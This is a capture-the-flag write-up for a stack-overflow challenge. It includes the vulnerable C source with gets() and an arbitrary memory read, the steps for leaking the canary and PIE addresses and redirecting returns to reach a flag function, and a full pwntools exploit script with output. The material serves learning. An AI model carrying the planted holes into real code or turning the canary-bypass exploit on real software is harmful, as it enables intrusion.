~so far the most entertaining challenge I have done 18/12/2024
# Initial observation:
Source code as follow:
```c
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <time.h>

static int passcode;

void UwU_flag(int arg1, int arg2, int arg3, int arg4,
			  int arg5, int arg6, int arg7, int arg8,
			  int arg9, int arg10, int arg11, int arg12)
{
	char flag[1024] = {0};
	char input[6];
	puts("What the hack!! How you did get here!! (ꐦ°᷄д°᷅) ");
	puts("But this time, you will need the passcode in order to get the flag (´∩ω∩｀)");
	FILE *f = fopen("flag.txt", "r");
	if (f == NULL)
	{
		printf("flag.txt file is missing (′゜ω。‵)\n");
		exit(1);
	}
	printf("* Please enter the passcode: ");
	fgets(input, 6, stdin);
	if (passcode == atoi(input))
	{
		if (arg8 != 0xdeadbeef)
		{
			printf("Your 8th argument is not 0xdeadbeef •_ゝ•");
			exit(1);
		}
		if (arg11 != 0xbeefdead)
		{
			printf("Your 11th argument is not 0xbeefdead •_ゝ•");
			exit(1);
		}
		fgets(flag, sizeof flag / sizeof *flag, f);
		puts("You beat me... Let me print the flag to you... ( ˘•ω•˘ )◞⁽˙³˙⁾");
		puts(flag);
	}
	exit(1);
}

void know_more_about_UwU()
{
	char addr[20];
	printf("\nGive UwU an address and UwU will tell you what is in that address!\n");
	printf("* Please enter an address e.g. 0x7fffdeadbeef: ");
	fgets(addr, 20, stdin);

	// UwU_main address is 0x555555400e27 (local PIE)
	// passcode address is 0x5555556020ec (local PIE)
	printf("That address contains %p\n\n", *(unsigned long long *)(void *)strtol(addr, NULL, 0));
}

void UwU_main()
{
	char choice[2];
	char UwU[8] = "UwU"; // this one is in rbp-0x70
	char buffer[80];
	puts("Welcome to the world of UwU!! ฅ^•ﻌ•^ฅ\n");

	puts("UwU knows that you may feel lose inside the world of UwU ψ(｀∇´)ψ\n");
	printf("Therefore, UwU is good enough to let you know you are in %p now（´◔ ₃ ◔`)\n", UwU_main);
	printf("and UwU is in %p\n\n", UwU);

	puts("Btw, do you want to know more about the world of UwU?");
	printf("* Please enter a choice (1:Yes, 2:Yes): ");
	fgets(choice, 2, stdin); // in rbp-0x80 somehow
	getchar();

	if ((atoi(choice) == 1) || (atoi(choice) == 2))
	{
		know_more_about_UwU();
	}
	else
	{
		puts("\nYou don't want to know more about UwU? (′゜ω。‵)\n");
	}

	puts("Then, can you create some UwU for UwU? ⁄(⁄ ⁄•⁄ω⁄•⁄ ⁄)⁄");
	gets(buffer); // starts writing from rbp_0x60
	// 96 bytes 
	
	char *ptr = strstr(buffer, "UwU");
	if (ptr != NULL && strstr(ptr, "UwUUwU") != NULL)
	{
		puts("Your UwU is UwU enough!! (╯✧∇✧)╯");
		if (strcmp(UwU, "UwU") != 0)
		{
			exit(1);
		}
	}
	else
	{
		puts("Your input is not UwU enough!! _(┐ ◟;ﾟдﾟ)ノ");
		exit(1);
	}
}

int main()
{
	setvbuf(stdin, NULL, 2, 0);
	setvbuf(stdout, NULL, 2, 0);
	setvbuf(stderr, NULL, 2, 0);

	srand(time(NULL));
	passcode = rand() % 100000;

	UwU_main();

	puts("See you next time!!（๑ • ‿ • ๑ ）\n");
	return 0;
}
```


From the source code, we can easily observe a few differences from the easier version of this `UwUOF+`. For stuff covered in the writeup of `UwUOF+`, they are not going to be mentioned here. For example, bypassing the filters of `UwU` and basic overflow techniques
## Passcode
First of all, there is a randomized passcode
```c
srand(time(NULL));
passcode = rand() % 100000;
```
which you would have to enter to get pass UwU_flag function 
```c
printf("* Please enter the passcode: ");
fgets(input, 6, stdin);
```
I first thought about bruteforcing but quickly I realized it probably would not work since that is no error messages for wrong input.
## Protections
```
┌──(kali㉿kali)-[~/Desktop/CTF/UwUOF++]
└─$ checksec program
[*] '/home/kali/Desktop/CTF/UwUOF++/program'
    Arch:       amd64-64-little
    RELRO:      Partial RELRO
    Stack:      Canary found
    NX:         NX enabled
    PIE:        PIE enabled
    Stripped:   No

```
We can see that the program is protected by `Canary`, `PIE`, etc. 
`Canary` :: a value stored somewhere in a function, that randomizes and different for each time the program executes   
Example of what happens at the end of function after writing canary:

`mov    rax,QWORD PTR [rbp-0x8]` retrieve the current value of where the canary was stored to see if it is still the same. If it is the same, jump to leave ; ret. If not, then it is going to call `0x0000555555400fa8 <+385>:   call   0x555555400a20 <__stack_chk_fail@plt>`
which brutally terminates the program   
```
pwndbg> ni
*** stack smashing detected ***: terminated
```

`PIE` :: instructions addresses are randomized 
## address leak message
```c
printf("Therefore, UwU is good enough to let you know you are in %p now（´◔ ₃ ◔`)\n", UwU_main);
printf("and UwU is in %p\n\n", UwU);
```
In the beginning, I have no idea what was the intention, motivation behind this message showcasing the address of `UwU_main` and location of `UwU`.
In fact, this provides key information to solve the challenge, i.e. the address leak which counters `PIE` protection, a protection that randomizes the addresses of functions, instructions for each program execution.

What is constant is the offset of functions, instructions from the base address, what I mean by offset is the following raw addresses of each assembly instructinos, they are all the "distances" of instructions from the base address of the program
```as
0000000000000e27 <UwU_main>:
e27:	55                   	push   rbp
e28:	48 89 e5             	mov    rbp,rsp
e2b:	48 83 c4 80          	add    rsp,0xffffffffffffff80
```
Once we know one of the instructions' address. For example, `0x5643afe00e27` being the runtime address of `e27:	55                   	push   rbp`, the starting address of UwU_main. We are able to calculate the addresses of any other instructions based on the offsets 
```py
UwU_main_offset = 0xe27
know_more_offset = 0xd97
main_offset = 0xfaf
UwU_flag_offset = 0xc60

know_more_addr = UwU_main_addr - UwU_main_offset + know_more_offset
main_addr = UwU_main_addr - UwU_main_offset + main_offset
UwU_flag_addr = UwU_main_addr - UwU_main_offset + UwU_flag_offset
```

Moreover, the address leak of `UwU` is probably intended for calculating the address of canary.   
We can calculate the exact runtime address of canary after knowing the address of `UwU`, because from the assembly, we know the offset of both `UwU` and `canary` from `rbp`
```as
0x0000555555400e2f <+8>:     mov    rax,QWORD PTR fs:0x28
0x0000555555400e38 <+17>:    mov    QWORD PTR [rbp-0x8],rax ; canary 
0x0000555555400e3c <+21>:    xor    eax,eax
0x0000555555400e3e <+23>:    mov    QWORD PTR [rbp-0x70],0x557755 ; UwU
```

We know that `rbp-0x8` is most likely canary because:
- canary is often first initialized (randomized) in fs:0x28, then gets passed to `rbp-0x8` to detect memory overwrites 
- canary typically {{ends in `0x00`}} and indeed the one in `rbp-0x8` always ends in `0x00`, which we'd know after inspecting with `x/gx $rbp-0x8` in pwndbg. For example, a canary may look like `0x270948b701efc000`

## Content leak
```c

void know_more_about_UwU()
{
	char addr[20];
	printf("\nGive UwU an address and UwU will tell you what is in that address!\n");
	printf("* Please enter an address e.g. 0x7fffdeadbeef: ");
	fgets(addr, 20, stdin);

	// UwU_main address is 0x555555400e27 (local PIE)
	// passcode address is 0x5555556020ec (local PIE)
	printf("That address contains %p\n\n", *(unsigned long long *)(void *)strtol(addr, NULL, 0));
}
```
The above function leaks content of a particular address, which is perfect for leaking the value of passcode and canary after we have calculated their addresses.   
Therefore, the plan is the get into this function twice. Following normal program flow, we would get in here at least once if we don't input anything other than 1 or 2 here:
```c
	puts("Btw, do you want to know more about the world of UwU?");
	printf("* Please enter a choice (1:Yes, 2:Yes): ");
	fgets(choice, 2, stdin); // in rbp-0x80 somehow
	getchar();

	if ((atoi(choice) == 1) || (atoi(choice) == 2))
	{
		know_more_about_UwU();
	}
```

To get in the second now, we overflow the return address of `UwU_main` from originally going back to `main` to `know_more_about_UwU` the content leaking function.  
To be able to overflow in `UwU_main`, we first need to get pass the canary protection in `UwU_main`. Therefore the flow would be something like:
```
Calculate addresses --> know_more_about_UwU --> 
Leak canary value in UwU_main --> Overflow and overwrite return address --> know_more_about_UwU (again) --> Leak passcode --> ...
```

## Returning to and from `know_more_about_UwU`
Before we dive into the intriguing mechansim of returning from a maliciously, mistakenly returned function, let's revise some of the basics 
### Basics of normal function return 
When `know_more_about_UwU` or any other function was called normally, instruction after the `call` instruction in previous function would be pushed during the call and ended up exactly above `saved old rbp` in the stack frame
```
04:0020│ rbp 0x7fffffffdb50 —▸ 0x7fffffffdbe0 —▸ 0x7fffffffdbf0 ◂— 1
05:0028│+008 0x7fffffffdb58 —▸ 0x555555400ef4 (UwU_main+205) ◂— jmp UwU_main+219
```
In above example snippet right before `know_more_about_UwU` returns to `UwU_main`, top line is `saved old rbp` intended to restore stack frame of the previous function. {{Which would be restored during `leave` instruction before return}}  
Second line is then the return address, which be very quickly be at top of the stack after `saved old rbp` is popped. It would then be popped in `rip` with `ret` instruction 
## What if we return from a function that we returned to 
The answer is: it simply return to the address of right above the return address to the function i.e. `rbp+0x10` (`rbp+0x8` holding the return address to the function we maliciously want to get into)
I did not know at all, what is the answer of the title question
Below is what solely based on my observation and testing:  

The following is the stack right before executing and `leave` and `ret` in `UwU_main`
```
pwndbg> stack 25
00:0000│ rsp 0x7fff6d7bb220 ◂— 0x31 /* '1' */
01:0008│-078 0x7fff6d7bb228 —▸ 0x7fff6d7bb240 ◂— 'UwUUwUAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA'
02:0010│ rdi 0x7fff6d7bb230 ◂— 0x557755 /* 'UwU' */
03:0018│-068 0x7fff6d7bb238 ◂— 0
04:0020│-060 0x7fff6d7bb240 ◂— 'UwUUwUAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA'
05:0028│-058 0x7fff6d7bb248 ◂— 'AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA'
... ↓        9 skipped
0f:0078│-008 0x7fff6d7bb298 ◂— 0xd456e33494259c00
10:0080│ rbp 0x7fff6d7bb2a0 ◂— 0x4141414141414141 ('AAAAAAAA')
11:0088│+008 0x7fff6d7bb2a8 —▸ 0x55c0f7e00d97 (know_more_about_UwU) ◂— push rbp
12:0090│+010 0x7fff6d7bb2b0 —▸ 0x55c0f7e00c60 (UwU_flag) ◂— push rbp
13:0098│+018 0x7fff6d7bb2b8 ◂— 0x3131313131313131 ('11111111')
14:00a0│+020 0x7fff6d7bb2c0 ◂— 0x3232323232323232 ('22222222')
15:00a8│+028 0x7fff6d7bb2c8 ◂— 0xdeadbeef
16:00b0│+030 0x7fff6d7bb2d0 ◂— 0x3333333333333333 ('33333333')
17:00b8│+038 0x7fff6d7bb2d8 ◂— 0x3434343434343434 ('44444444')
18:00c0│+040 0x7fff6d7bb2e0 ◂— 0xbeefdead
```

The following is the stack right after we bypassed canary and maliciously returned to `know_more_about_UwU`, entering it the second time
```
pwndbg> stack 25
00:0000│ rsp 0x7ffe5516a6e0 —▸ 0x564e2ac00c60 (UwU_flag) ◂— push rbp
01:0008│     0x7ffe5516a6e8 ◂— 0x3131313131313131 ('11111111')
02:0010│     0x7ffe5516a6f0 ◂— 0x3232323232323232 ('22222222')
03:0018│     0x7ffe5516a6f8 ◂— 0xdeadbeef
04:0020│     0x7ffe5516a700 ◂— 0x3333333333333333 ('33333333')
05:0028│     0x7ffe5516a708 ◂— 0x3434343434343434 ('44444444')
06:0030│     0x7ffe5516a710 ◂— 0xbeefdead
07:0038│     0x7ffe5516a718 ◂— 0x3db2ac3078c80a00
08:0040│     0x7ffe5516a720 ◂— 0
```
we can see that `rsp 0x7ffce08e2250 —▸ 0x558dcf400c60 (UwU_flag) ◂— push rbp` which was located at `rbp+0x10`, right above the address that got us into `know_more_about_UwU` at `rbp+0x8` is now at `rsp`. 
A while later, after the `push rbp` instruction, this `0x558dcf400c60 (UwU_flag)` address would then officially be us return address at the typical location `rbp+0x8` above `"saved old rbp"`
That's exactly how we can return to `UwU_flag` from `know_more_about_UwU` with just one payload we wrote for previous stack frame


Our corresponding exploit payload:
```py
payload = b'UwUUwU'+ b'A' * 82 # 88 bytes to get to canary
payload += p64(leaked_canary) # replace with variable that stores it
payload += b'A' * 8 # goes to return address 
payload += p64(know_more_addr)
payload += p64(UwU_flag_addr)
payload += b'1' * 8 # padding between deadbeef and rbp 
payload += b'2' * 8 # padding between deadbeef and rbp 
payload += p64(0xdeadbeef)
payload += b'3' * 8 # padding between deadbeef and beefdead  
payload += b'4' * 8 # padding between deadbeef and beefdead  
payload += p64(0xbeefdead)
```


```c
void UwU_flag(int arg1, int arg2, int arg3, int arg4,
			  int arg5, int arg6, int arg7, int arg8,
			  int arg9, int arg10, int arg11, int arg12)
{
	char flag[1024] = {0};
	char input[6];
	puts("What the hack!! How you did get here!! (ꐦ°᷄д°᷅) ");
	puts("But this time, you will need the passcode in order to get the flag (´∩ω∩｀)");
	FILE *f = fopen("flag.txt", "r");
	if (f == NULL)
	{
		printf("flag.txt file is missing (′゜ω。‵)\n");
		exit(1);
	}
	printf("* Please enter the passcode: ");
	fgets(input, 6, stdin);
	if (passcode == atoi(input))
	{
		if (arg8 != 0xdeadbeef)
		{
			printf("Your 8th argument is not 0xdeadbeef •_ゝ•");
			exit(1);
		}
		if (arg11 != 0xbeefdead)
		{
			printf("Your 11th argument is not 0xbeefdead •_ゝ•");
			exit(1);
		}
		fgets(flag, sizeof flag / sizeof *flag, f);
		puts("You beat me... Let me print the flag to you... ( ˘•ω•˘ )◞⁽˙³˙⁾");
		puts(flag);
	}
	exit(1);
}
```

```as
   0x000055c0f7e00d18 <+184>:   cmp    DWORD PTR [rbp+0x18],0xdeadbeef
   0x000055c0f7e00d1f <+191>:   je     0x55c0f7e00d3c <UwU_flag+220>
   0x000055c0f7e00d21 <+193>:   lea    rdi,[rip+0x4b8]        # 0x55c0f7e011e0
   0x000055c0f7e00d28 <+200>:   mov    eax,0x0
   0x000055c0f7e00d2d <+205>:   call   0x55c0f7e00a30 <printf@plt>
   0x000055c0f7e00d32 <+210>:   mov    edi,0x1
   0x000055c0f7e00d37 <+215>:   call   0x55c0f7e00af0 <exit@plt>
   0x000055c0f7e00d3c <+220>:   cmp    DWORD PTR [rbp+0x30],0xbeefdead
```

### UwU_flag function prologue and arguments assignment 
```as
   0x000055c0f7e00c60 <+0>:     push   rbp
   0x000055c0f7e00c61 <+1>:     mov    rbp,rsp
   0x000055c0f7e00c64 <+4>:     add    rsp,0xffffffffffffff80
   0x000055c0f7e00c68 <+8>:     mov    DWORD PTR [rbp-0x64],edi
   0x000055c0f7e00c6b <+11>:    mov    DWORD PTR [rbp-0x68],esi
   0x000055c0f7e00c6e <+14>:    mov    DWORD PTR [rbp-0x6c],edx
   0x000055c0f7e00c71 <+17>:    mov    DWORD PTR [rbp-0x70],ecx
   0x000055c0f7e00c74 <+20>:    mov    DWORD PTR [rbp-0x74],r8d
   0x000055c0f7e00c78 <+24>:    mov    DWORD PTR [rbp-0x78],r9d
   0x000055c0f7e00c7c <+28>:    mov    rax,QWORD PTR fs:0x28
   0x000055c0f7e00c85 <+37>:    mov    QWORD PTR [rbp-0x8],rax
```
- We can see that the first 6 arguments follow x64 calling convetion and are passed in registers
- Arguments 7 and beyond are {{pushed onto the stack}} by the caller before the function call, in reverse order (right to left). They are not {{explicitly assigned in the function prologue}} because they're already on the stack at fixed offsets from rbp but not on registers that are mainly responsible for transfering values, so they do not need to be assigned to anything. 

"Right to left" means arguments are pushed in reverse order of how they appear in the function declaration. For example
```c
void func(int arg1, int arg2, int arg3) // pushed as: arg3, arg2, arg1
```
There is why argument 8 is at location higher than argument 11.  


We can see from entire assembly dump that there's no explicit assigment of the 7th and beyond arguments:
```as
Dump of assembler code for function UwU_flag:
   0x000055c0f7e00c60 <+0>:     push   rbp
   0x000055c0f7e00c61 <+1>:     mov    rbp,rsp
   0x000055c0f7e00c64 <+4>:     add    rsp,0xffffffffffffff80
   0x000055c0f7e00c68 <+8>:     mov    DWORD PTR [rbp-0x64],edi
   0x000055c0f7e00c6b <+11>:    mov    DWORD PTR [rbp-0x68],esi
   0x000055c0f7e00c6e <+14>:    mov    DWORD PTR [rbp-0x6c],edx
   0x000055c0f7e00c71 <+17>:    mov    DWORD PTR [rbp-0x70],ecx
   0x000055c0f7e00c74 <+20>:    mov    DWORD PTR [rbp-0x74],r8d
   0x000055c0f7e00c78 <+24>:    mov    DWORD PTR [rbp-0x78],r9d
   0x000055c0f7e00c7c <+28>:    mov    rax,QWORD PTR fs:0x28
   0x000055c0f7e00c85 <+37>:    mov    QWORD PTR [rbp-0x8],rax
   0x000055c0f7e00c89 <+41>:    xor    eax,eax
   0x000055c0f7e00c8b <+43>:    lea    rdi,[rip+0x466]        # 0x55c0f7e010f8
   0x000055c0f7e00c92 <+50>:    call   0x55c0f7e00a10 <puts@plt>
   0x000055c0f7e00c97 <+55>:    lea    rdi,[rip+0x49a]        # 0x55c0f7e01138
   0x000055c0f7e00c9e <+62>:    call   0x55c0f7e00a10 <puts@plt>
   0x000055c0f7e00ca3 <+67>:    lea    rsi,[rip+0x4e1]        # 0x55c0f7e0118b
   0x000055c0f7e00caa <+74>:    lea    rdi,[rip+0x4dc]        # 0x55c0f7e0118d
   0x000055c0f7e00cb1 <+81>:    call   0x55c0f7e00ad0 <fopen@plt>
   0x000055c0f7e00cb6 <+86>:    mov    QWORD PTR [rbp-0x58],rax
   0x000055c0f7e00cba <+90>:    cmp    QWORD PTR [rbp-0x58],0x0
   0x000055c0f7e00cbf <+95>:    jne    0x55c0f7e00cd7 <UwU_flag+119>
   0x000055c0f7e00cc1 <+97>:    lea    rdi,[rip+0x4d0]        # 0x55c0f7e01198
   0x000055c0f7e00cc8 <+104>:   call   0x55c0f7e00a10 <puts@plt>
   0x000055c0f7e00ccd <+109>:   mov    edi,0x1
   0x000055c0f7e00cd2 <+114>:   call   0x55c0f7e00af0 <exit@plt>
   0x000055c0f7e00cd7 <+119>:   lea    rdi,[rip+0x4e4]        # 0x55c0f7e011c2
   0x000055c0f7e00cde <+126>:   mov    eax,0x0
   0x000055c0f7e00ce3 <+131>:   call   0x55c0f7e00a30 <printf@plt>
   0x000055c0f7e00ce8 <+136>:   mov    rdx,QWORD PTR [rip+0x2013e1]        # 0x55c0f80020d0 <stdin@@GLIBC_2.2.5>
   0x000055c0f7e00cef <+143>:   lea    rax,[rbp-0x50]
   0x000055c0f7e00cf3 <+147>:   mov    esi,0x6
   0x000055c0f7e00cf8 <+152>:   mov    rdi,rax
   0x000055c0f7e00cfb <+155>:   call   0x55c0f7e00a60 <fgets@plt>
   0x000055c0f7e00d00 <+160>:   lea    rax,[rbp-0x50]
   0x000055c0f7e00d04 <+164>:   mov    rdi,rax
   0x000055c0f7e00d07 <+167>:   call   0x55c0f7e00ae0 <atoi@plt>
   0x000055c0f7e00d0c <+172>:   mov    edx,eax
   0x000055c0f7e00d0e <+174>:   mov    eax,DWORD PTR [rip+0x2013d8]        # 0x55c0f80020ec <passcode>
   0x000055c0f7e00d14 <+180>:   cmp    edx,eax
   0x000055c0f7e00d16 <+182>:   jne    0x55c0f7e00d8d <UwU_flag+301>
   0x000055c0f7e00d18 <+184>:   cmp    DWORD PTR [rbp+0x18],0xdeadbeef
   0x000055c0f7e00d1f <+191>:   je     0x55c0f7e00d3c <UwU_flag+220>
   0x000055c0f7e00d21 <+193>:   lea    rdi,[rip+0x4b8]        # 0x55c0f7e011e0
   0x000055c0f7e00d28 <+200>:   mov    eax,0x0
   0x000055c0f7e00d2d <+205>:   call   0x55c0f7e00a30 <printf@plt>
   0x000055c0f7e00d32 <+210>:   mov    edi,0x1
   0x000055c0f7e00d37 <+215>:   call   0x55c0f7e00af0 <exit@plt>
   0x000055c0f7e00d3c <+220>:   cmp    DWORD PTR [rbp+0x30],0xbeefdead
   0x000055c0f7e00d43 <+227>:   je     0x55c0f7e00d60 <UwU_flag+256>
   0x000055c0f7e00d45 <+229>:   lea    rdi,[rip+0x4c4]        # 0x55c0f7e01210
   0x000055c0f7e00d4c <+236>:   mov    eax,0x0
   0x000055c0f7e00d51 <+241>:   call   0x55c0f7e00a30 <printf@plt>
   0x000055c0f7e00d56 <+246>:   mov    edi,0x1
   0x000055c0f7e00d5b <+251>:   call   0x55c0f7e00af0 <exit@plt>
   0x000055c0f7e00d60 <+256>:   mov    rdx,QWORD PTR [rbp-0x58]
   0x000055c0f7e00d64 <+260>:   lea    rax,[rbp-0x40]
   0x000055c0f7e00d68 <+264>:   mov    esi,0x2a
   0x000055c0f7e00d6d <+269>:   mov    rdi,rax
   0x000055c0f7e00d70 <+272>:   call   0x55c0f7e00a60 <fgets@plt>
   0x000055c0f7e00d75 <+277>:   lea    rdi,[rip+0x4c4]        # 0x55c0f7e01240
   0x000055c0f7e00d7c <+284>:   call   0x55c0f7e00a10 <puts@plt>
   0x000055c0f7e00d81 <+289>:   lea    rax,[rbp-0x40]
   0x000055c0f7e00d85 <+293>:   mov    rdi,rax
   0x000055c0f7e00d88 <+296>:   call   0x55c0f7e00a10 <puts@plt>
   0x000055c0f7e00d8d <+301>:   mov    edi,0x1
   0x000055c0f7e00d92 <+306>:   call   0x55c0f7e00af0 <exit@plt>
```
It seems like function parameters beyond 6 were not explicitly assigned

Typical memory layout on function call with more than 6 arguments:
```apache
[higher addresses]
rbp+0x30: arg11 (0xbeefdead)   
...
rbp+0x18: arg8  (0xdeadbeef)
...
rbp+0x10: arg7
rbp+0x08: Return address
rbp+0x00: Saved RBP
[lower addresses]
```
There is why we see this on after function prologue in UwU_flag. It is just that we are not doing normal function call so our `saved rbp` and `return address` are something weird

```as
10:0080│ rbp 0x7fff6d7bb2b0 ◂— 0x4141414141414141 ('AAAAAAAA')
11:0088│+008 0x7fff6d7bb2b8 ◂— 0x3131313131313131 ('11111111')
12:0090│+010 0x7fff6d7bb2c0 ◂— 0x3232323232323232 ('22222222')
13:0098│+018 0x7fff6d7bb2c8 ◂— 0xdeadbeef
14:00a0│+020 0x7fff6d7bb2d0 ◂— 0x3333333333333333 ('33333333')
15:00a8│+028 0x7fff6d7bb2d8 ◂— 0x3434343434343434 ('44444444')
16:00b0│+030 0x7fff6d7bb2e0 ◂— 0xbeefdead
```

Additional: stack right before going into UwU_flag from know_more_about_UwU
```as
pwndbg> stack 25
00:0000│ rsp 0x7fff6d7bb288 ◂— '0x55c0f80020ec\n'
01:0008│-018 0x7fff6d7bb290 ◂— 0xa636530323030 /* '0020ec\n' */
02:0010│-010 0x7fff6d7bb298 ◂— 0xd456e33494259c00
03:0018│-008 0x7fff6d7bb2a0 ◂— 0xd456e33494259c00
04:0020│ rbp 0x7fff6d7bb2a8 ◂— 0x4141414141414141 ('AAAAAAAA')
05:0028│+008 0x7fff6d7bb2b0 —▸ 0x55c0f7e00c60 (UwU_flag) ◂— push rbp
06:0030│+010 0x7fff6d7bb2b8 ◂— 0x3131313131313131 ('11111111')
07:0038│+018 0x7fff6d7bb2c0 ◂— 0x3232323232323232 ('22222222')
08:0040│+020 0x7fff6d7bb2c8 ◂— 0xdeadbeef
09:0048│+028 0x7fff6d7bb2d0 ◂— 0x3333333333333333 ('33333333')
0a:0050│+030 0x7fff6d7bb2d8 ◂— 0x3434343434343434 ('44444444')
0b:0058│+038 0x7fff6d7bb2e0 ◂— 0xbeefdead
```

Keys to overcoming the challenge:
1. the use of address and content leak
2. understanding the protection
3. address calculation 
4. understanding in memory layout changes during function calls and abnormal returns 
5. memory layout of function with arguments 

Challenge flow conclusion:
```
Calculate addresses --> know_more_about_UwU --> 
Leak canary value in UwU_main --> Overflow and overwrite return address --> know_more_about_UwU (again) --> Leak passcode --> 
jump to UwU_flag and overwrite more to prepare for 8th and 11th arguments
- entirely within one payload


--> again receive line and sendline bypassing passcode
--> wait for flag
```

### Solve script:
```py
from pwn import * 
import os 

  # This shows the ./program process PID
 # If you're using tmux
# context.terminal = ['gnome-terminal', '--'] # If you're using gnome-terminal

p = process("./program")
#p = remote("chal.firebird.sh", 35020)

print(f"[*] Python script PID: {os.getpid()}")
print(f"[*] Binary PID: {p.pid}")

p.recvuntil(b"you are in ")
UwU_main_addr = int(p.recvuntil(b" ").strip(), 16)
print("[*] UwU_main address:", hex(UwU_main_addr))
# Get output until the UwU location is printed
p.recvuntil(b"UwU is in ")
uwu_addr = int(p.recvuntil(b"\n").strip(), 16)  # This will get 0x7fff4a896940 as int
print("[*] UwU address:", hex(uwu_addr))

# Calculate rbp address (UwU is at rbp-0x70)

rbp_addr = uwu_addr + 0x70
print("[*] RBP address:", hex(rbp_addr))

UwU_main_offset = 0xe27
know_more_offset = 0xd97
main_offset = 0xfaf
UwU_flag_offset = 0xc60
know_more_addr = UwU_main_addr - UwU_main_offset + know_more_offset
main_addr = UwU_main_addr - UwU_main_offset + main_offset
UwU_flag_addr = UwU_main_addr - UwU_main_offset + UwU_flag_offset

print("[*] main address:", hex(main_addr))
passcode_addr = main_addr - 0xfaf + 0x104a + 0x2010a2

# Now we can continue with the rest of the exploit
p.recvuntil(b"Please enter a choice (1:Yes, 2:Yes):")
p.sendline(b'1')

# ... rest of your exploit
p.recvuntil(b"Please enter an address e.g. 0x7fffdeadbeef:")
canary_location = hex(rbp_addr - 8)
p.sendline(canary_location)
p.recvuntil(b"contains ")
leaked_canary = int(p.recvuntil(b"\n").strip(), 16)
print("[*] leaked canary:", hex(leaked_canary))
payload = b'UwUUwU'+ b'A' * 82 # 88 bytes to get to canary
payload += p64(leaked_canary) # replace with variable that stores it
payload += b'A' * 8 # goes to return address 
payload += p64(know_more_addr)
payload += p64(UwU_flag_addr)
payload += b'1' * 8 # padding between deadbeef and rbp 
payload += b'2' * 8 # padding between deadbeef and rbp 
payload += p64(0xdeadbeef)
payload += b'3' * 8 # padding between deadbeef and beefdead  
payload += b'4' * 8 # padding between deadbeef and beefdead  
payload += p64(0xbeefdead)




pause()
p.sendline(payload)
pause()
p.recvuntil(b"Please enter an address e.g. 0x7fffdeadbeef:")
p.sendline(hex(passcode_addr))
p.recvuntil(b"contains ")
leaked_passcode = int(p.recvuntil(b"\n").strip(), 16)
print("[*] leaked passcode:", hex(leaked_passcode))

# Bypassing passcode 
p.recvuntil(b"* Please enter the passcode: ")
p.sendline(str(leaked_passcode).encode())


p.interactive()



'''parse_ldd_output
┌──(kali㉿kali)-[~/Desktop/CTF/UwUOF++]
└─$ python solve.py
[+] Opening connection to chal.firebird.sh on port 35020: Done
[*] UwU_main address: 0x556920c78e27
[*] UwU address: 0x7ffc1cd566d0
[*] RBP address: 0x7ffc1cd56740
[*] main address: 0x556920c78faf
/home/kali/Desktop/CTF/UwUOF++/solve.py:45: BytesWarning: Text is not bytes; assuming ASCII, no guarantees. See https://docs.pwntools.com/#bytes
  p.sendline(canary_location)
[*] leaked canary: 0xb4782f2a66996a00
[*] Paused (press any to continue)
[*] Paused (press any to continue)
/home/kali/Desktop/CTF/UwUOF++/solve.py:69: BytesWarning: Text is not bytes; assuming ASCII, no guarantees. See https://docs.pwntools.com/#bytes
  p.sendline(hex(passcode_addr))
[*] leaked passcode: 0x122bf
[*] Switching to interactive mode
You beat me... Let me print the flag to you... ( ˘•ω•˘ )◞⁽˙³˙⁾
flag{y0u_b3a7_7h3_g0d_0f_UwU_w17h_B0F!?}
'''
```